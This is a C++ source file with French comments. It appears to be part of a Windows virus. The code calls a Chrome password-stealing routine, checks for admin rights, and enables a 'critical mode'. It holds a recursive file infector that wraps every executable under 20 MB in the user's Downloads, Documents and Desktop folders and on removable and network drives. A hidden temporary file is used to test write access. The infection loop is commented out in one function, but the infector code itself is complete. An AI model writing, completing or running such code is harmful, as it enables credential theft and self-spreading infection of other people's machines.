#include <ShellAPI.h>
#include <KnownFolders.h>
#include <ShlObj.h>
#include <atlstr.h>

#include "conneries.h"

void Infecter(string dossier);
void AjDossierUti(_GUID IdDossier, vector<string> &ListeDossiers);
void AjPeripheriques(vector<string> &ListeDossiers);
bool AccesEcriture(string chemin);

// R�cup dossier bureau
string getBureau() {
	// R�cup chemin via WinAPI
	PWSTR Chemin = 0;
	SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &Chemin);
	// Conversion en char
	char Retour[500];
	WideCharToMultiByte(CP_ACP, 0, Chemin, -1, Retour, sizeof(Retour), NULL, NULL);
	// Nettoyage m�moire
	CoTaskMemFree(Chemin);
	// Ajout � la liste
	return string(Retour) + "\\";
}

string chemOrig; // Chemin de l'exe original, lanc� avant
void DarkMode() {
	// Activatio mode critique
	ModeCritique(true);
	#ifdef Mode_Dev
	Debug("Debut dark mode");
	#endif

	// D�tection si droits admin
	bool ModeAdmin = IsUserAnAdmin();

	// ----- ACTIONS -----
	if (ModeAdmin) {
		// Nakashi dans system32
		#ifdef Mode_Dev
			Debug("Mode admin :D");
		#endif
	}

	string donnees = MdpChrome();
	Debug("Recup: " + donnees);

	// ---- INFECTION ----
	vector<string> aInfecter = {};

	// Dossiers utilisateur
	/*AjDossierUti(FOLDERID_Downloads, aInfecter);
	AjDossierUti(FOLDERID_Documents, aInfecter);
	AjDossierUti(FOLDERID_Desktop, aInfecter);
	// P�riph�riques
	AjPeripheriques(aInfecter);

	// Execution
	for (string CheminDoss : aInfecter)
		Infecter(CheminDoss);*/

	#ifdef Mode_Dev
	Debug("Fin");
	#endif

	//Desactivatio mode critique
	ModeCritique(false);
}

int TailleMax = 20; // Taille max des exe � infecter en MB
void Infecter(string dossier) {
	// Completion du chemin
	if (dossier.back() != '\\')
		dossier += '\\';
	string chRecherche = dossier + "*";

	// Parcours des �lements
	WIN32_FIND_DATA Element;
	HANDLE listeFichiers = FindFirstFile(chRecherche.c_str(), &Element);
	if (listeFichiers != INVALID_HANDLE_VALUE) {
		// D�termination si �criture possible dans le r�pertoire actuel
		bool EcritureOK = AccesEcriture(dossier);

		// Parcours de chaque �lement du repertoire
		do {
			// Exclusion r�pertoire pr�cedent & actuel
			if (	strcmp(Element.cFileName, ".") != 0 &&
					strcmp(Element.cFileName, "..") != 0) {
				// Chemin complet de l'�lement actuel
				string chemin = dossier + Element.cFileName;

				// Traitement en fonction du type de l'�lement ...
				if (Element.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					// ---- DOSSIER ----
					Infecter(chemin);
				else if (EcritureOK) {
					// ---- FICHIER ----
					if (chemin.substr(chemin.find_last_of(".") + 1) == "exe") {
						// ------ EXE ------
						// Verif taille max et si ce n'est pas l'original lanc� avant
						if (	Element.nFileSizeLow <= TailleMax * 1000000 &&
								chemin != chemOrig)
							// Emballage si possible
							Emballer(chemin, false);
					}
				}
			}
		} while (FindNextFile(listeFichiers, &Element));
		FindClose(listeFichiers);
	}
}

void AjDossierUti(_GUID IdDossier, vector<string> &ListeDossiers) {
	// R�cup chemin via WinAPI
	PWSTR Chemin = 0;
	SHGetKnownFolderPath(IdDossier, 0, NULL, &Chemin);
	// Conversion en char
	char Retour[500];
	WideCharToMultiByte(CP_ACP, 0, Chemin, -1, Retour, sizeof(Retour), NULL, NULL);
	// Nettoyage m�moire
	CoTaskMemFree(Chemin);
	// Ajout � la liste
	ListeDossiers.push_back(string(Retour) + "\\");
}

void AjPeripheriques(vector<string> &ListeDossiers) {
	// Cr�ation de la liste des p�riph�riques
	DWORD listePerif = GetLogicalDrives();

	// Parcours ...
	for (int numPerif = 0; numPerif < 26; numPerif++) {
		// Recup du chemin
		char    chemin[_MAX_DRIVE + 1];
		sprintf_s(chemin, "%c:\\", numPerif + 'A');

		// Recup & �rification du type
		UINT typePerif = GetDriveType(chemin);
		if (typePerif == DRIVE_REMOTE || typePerif == DRIVE_REMOVABLE)
			ListeDossiers.push_back(chemin);
	}
}

bool AccesEcriture(string chemin) {
	string fTest = chemin + "thumb.db";

	HANDLE TestAcces = CreateFile(fTest.c_str(),
		GENERIC_WRITE,
		FILE_SHARE_DELETE,
		0,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY,
		NULL);

	if (TestAcces != INVALID_HANDLE_VALUE) {
		DeleteFile(fTest.c_str());
		return true;
	} else
		return false;
}